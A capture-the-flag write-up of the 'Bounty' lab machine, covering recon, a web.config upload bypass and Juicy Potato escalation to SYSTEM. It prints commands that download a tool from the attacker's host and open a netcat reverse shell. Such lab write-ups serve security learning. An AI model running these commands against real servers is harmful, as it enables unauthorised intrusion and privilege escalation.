# Recon

I do my initial scan to see which ports are open.

## nmap
```
# Nmap 7.92 scan initiated Thu Aug 11 19:14:08 2022 as: nmap -p- -oA first/scan --min-rate 5000 --max-retries 3 --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -vv bounty.htb

```

Then run `nmap` again with default scripts (`-sC`) and service discovery (`-sV`) on the ports that were found from the first scan.

I also ran a UDP scan, vuln scan and fuzzed for subdomains but didn't get much back, so it looks like we are working with Microsoft IIS httpd 7.5 on port 80.

# Enumeration

## Nikto

There really wasn't much from Nikto, although I did make note of the x-aspnet-version header as I thought this could be helpful for later.

```
- Nikto v2.1.6/2.1.5
+ Target Host: bounty.htb
+ Target Port: 80
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 2.0.50727
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
```

## Website

We are greeted with Merlin. Running `binwalk` and `steghide` against this image was not helpful.

Looking at `/transfer.aspx`, we see there is a form to upload files. When testing this form, we find that it rejects a number of file extensions except for images -- such as `.png` and `.jpg`. Injecting a payload into an image file using msfvenom does not work, so I end up coming across this page on Hacktricks which explains using `web.config` for our initial foothold.

![d08887692cb3aec0d543cecf8896eb16.png](../_resources/d08887692cb3aec0d543cecf8896eb16.png)

I found a GitHub repo with a malicious `web.config` which returns a web shell although unfortunately I was not able to get a reverse shell back for some reason.

After a bit more digging, I come across a different `web.config`:
https://raw.githubusercontent.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/master/web.config

I'll give this a try so I edit the `web.config` and make sure `Invoke-PowerShellTcp.ps1` is also modified to catch my reverse shell.

`Invoke-PowerShellTcp.ps1`:

Start my python http server for `Invoke-PowerShellTcp.ps1` to be downloaded to the victim...

And start nc to catch the reverse shell from Bounty.
![rshell.png](../_resources/rshell.png)

After uploading the malicious `web.config` and visiting `http://bounty.htb/Uploadedfiles/web.config`, we get a shell back as `bounty\merlin`. When checking current privileges for the service account with `whoami /priv` we that it looks like `SeImpersonatePrivilege` is enabled. From previous boxes, I know that when we get a shell back as a service account with this privilege enabled, that Juicy Potato might be a good privilege escalation tool.

I'll download Netcat and JuicyPotato to the box using the following command `IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.64:9999/JuicyPotato.exe', 'C:\windows\temp\jp.exe')`

![jpandnc.png](../_resources/jpandnc.png)

I will use the following Juicy Potato command to achieve privilege escalation to SYSTEM.

`.\jp.exe -l 1234 -p "C:\Windows\System32\cmd.exe" -a "/c c:\windows\temp\nc64.exe -e cmd.exe 10.10.14.64 7331" -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"`

Information about the flags that were used can be found from JP documentation, although I will briefly explain:

`-l 1234`: Use arbitrary DCOM port 1234.

`-p "C:\Windows\System32\cmd.exe"`: Tell JP to use `cmd.exe` as the main program for this.

`-a "/c c:\windows\temp\nc64.exe -e cmd.exe 10.10.14.64 7331"`: This is the command that should be passed to `-p` which in our case is `cmd.exe`. To be specific, we are telling `cmd.exe` to execute `nc64.exe` with elevated privileges and execute our reverse shell which we will catch on a new netcat instance listening on port 7331.

`-t *` try both `createprocess` calls (`<t> CreateProcessWithTokenW, <u> CreateProcessAsUser)`

`-c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"`: This is the CLSID I found from JP's documentation here (Note: it took a few tries to find a CLSID that worked):
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

And we are now SYSTEM!

For some reason the `user.txt` flag for `merlin` was hidden which was a little confusing, but I ran `dir /A` to show all files to see that it exists. Other than that, we collect our loot as normal and move on to the next box! :)
